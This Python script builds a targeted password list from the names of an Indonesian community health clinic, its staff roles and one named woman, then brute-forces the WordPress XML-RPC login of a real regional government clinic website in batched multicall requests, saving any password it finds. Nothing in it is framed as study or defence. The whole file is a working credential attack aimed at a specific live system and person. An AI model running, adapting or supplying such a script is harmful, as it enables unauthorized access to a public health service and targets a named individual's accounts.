
import requests, sys, itertools

# 1. 200,000+ GENERATOR LENGKAP (WIWIED + PUSKESMAS)
# ==================================================
keywords = [
    # Organisasi & Tempat
    "puskesjaten", "puskesjaten1", "jaten", "puskesjaten1", 
    "puskes", "puskesmas", "pustu", "pustujaten", "pusjaten",
    "karanganyar", "kra", "karanganyarkab", "dinkes", "dinas",
    "kesehatan", "sehat", "puskbj1", "pkmjaten", "pkm",
    
    # Peran & Umum
    "admin", "operator", "bidan", "dokter", "perawat", "apoteker", "gawatdarurat",
    "kepala", "kapus", "ibu", "bu",
    
    # NAMA SPESIFIK & VARIASI (sesuai request)
    "wiwied", "wiwid", "wied", "widyawati", "widya", "wiedy"
]
years = ["2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026"]
suffixes = ["", "1", "123", "1234", "12345", "!", "*", "@", "#"]
separators = ["", ".", "_", "-", " "]

passwords = set()

def variants(word):
    """Case variants: lower, Upper, Title"""
    return [word, word.upper(), word.capitalize()]

def leet(word):
    """Leet substitutions"""
    mapping = str.maketrans("aioesbg", "4103586")
    return word.translate(mapping)

print("[*] Generating VERY COMPREHENSIVE password list (Wiwied & combinations)...")

# --- PHASE 1: Single Words + Suffixes ---
# e.g., Puskes2024, Wiwied!
for k in keywords:
    for v in variants(k):
        for s in suffixes + years:
            passwords.add(f"{v}{s}")
            passwords.add(f"{v}{s}!") # e.g. Wiwied2024!
            passwords.add(f"{s}{v}") # 2024Wiwied

# --- PHASE 2: Two-Word Combinations ---
# e.g., Puskesmas Jaten, Wiwied Widyawati, Admin Jaten
# Filter keywords mainly to relevant ones to avoid overly massive list
relevant_k = [x for x in keywords if len(x) > 3 or x in ["ibu","bu","kra"]]

# Create permutations of length 2
for c in itertools.permutations(relevant_k, 2):
    w1, w2 = c
    # Only process if meaningful combos (reduce junk)
    # Check if one of them is a Name OR a key Location/Role 
    # (avoid stuff like 'dinas karanganyarkab' which is too long/rare)
    is_name = any(n in w1 for n in ["wiwied","widya","wied"]) or any(n in w2 for n in ["wiwied","widya","wied"])
    
    if is_name or w1 in ["puskes","jaten","admin","puskesmas"] or w2 in ["jaten","kra"]:
        for v1 in variants(w1):
            for v2 in variants(w2):
                for sep in separators:
                    base = f"{v1}{sep}{v2}"
                    passwords.add(base)
                    
                    # Add suffixes to combos
                    for s in ["1", "123", "2024", "2025", "!"]:
                        passwords.add(f"{base}{s}")
                        passwords.add(f"{base}{sep}{s}") 

# --- PHASE 3: Specific Full Name logic (Wiwied Widyawati) ---
full_name_combos = [
    ("wiwied", "widyawati"), ("widyawati", "wiwied"), 
    ("dr", "wiwied"), ("ibu", "wiwied"), ("kapus", "wiwied")
]
for first, last in full_name_combos:
    for v1 in variants(first):
        for v2 in variants(last):
            for sep in separators: # incl space, dot, underscore
                base = f"{v1}{sep}{v2}"
                passwords.add(base)
                # Suffix logic
                for s in years + ["123", "!"]:
                    passwords.add(f"{base}{s}")     # WiwiedWidyawati2024
                    passwords.add(f"{base}{sep}{s}") # Wiwied.Widyawati.2024

# --- PHASE 4: Leet ---
leet_set = set()
for p in passwords:
    if 6 < len(p) < 15: # Only leet reasonable lengths
        lp = leet(p.lower())
        if lp != p.lower():
            leet_set.add(lp.capitalize())
            leet_set.add(lp)
passwords.update(leet_set)

# --- PHASE 5: User Specific Raw Inputs ---
raw_inputs = [
    "puskesjaten", "pusjaten1", "puskemasjaten1", "puskesmas jaten", 
    "puskesmas_jaten", "wiwied", "wiwit", "wiwied widyawati", "wiwiedwidyawati"
]
for r in raw_inputs:
    for v in variants(r):
        passwords.add(v)
        for s in years + ["123", "!"]:
             passwords.add(f"{v}{s}")

wordlist = sorted(list(passwords), key=len)
print(f"[*] Generated unique passwords: {len(wordlist)}")

# 2. BRUTE FORCE
url = "https://puskesjaten1.karanganyarkab.go.id/xmlrpc.php"
user = "puskesjaten1"
proxies = None 

print(f"[*] Launching FINAL KILLER attack on {url}...")

# XML-RPC Brute Force Logic (Optimized Batching)
BATCH_SIZE = 500
total = len(wordlist)

for i in range(0, total, BATCH_SIZE):
    batch = wordlist[i:i+BATCH_SIZE]
    
    # Build MultiCall XML
    calls = ""
    for p in batch:
        p_esc = p.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;")
        calls += f"<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{user}</string></value><value><string>{p_esc}</string></value></data></array></value></member></struct></value>"
    
    payload = f"<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>"
    
    try:
        r = requests.post(url, data=payload, proxies=proxies, timeout=45, headers={"Content-Type":"text/xml", "User-Agent":"Mozilla/5.0"})
        if "isAdmin" in r.text or "struct" in r.text and r.text.count("<struct>") > r.text.count("faultCode"):
             # Found something!
             print(f"\n[!] POTENTIAL MATCH in batch {i}-{i+len(batch)}! Checking 1-by-1...")
             for p in batch:
                check_single = f"<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{user}</string></value></param><param><value><string>{p}</string></value></param></params></methodCall>"
                r2 = requests.post(url, data=check_single, proxies=proxies, timeout=10)
                if "isAdmin" in r2.text:
                    print(f"\n[+] PASSWORD FOUND: {p}")
                    with open("FOUND_FINAL.txt", "w") as f: f.write(p)
                    sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")

    # Progress
    print(f"\r[*] Tested {min(i+BATCH_SIZE, total)}/{total}...", end="")

print("\n[-] Finished. No password found via targeted list.")
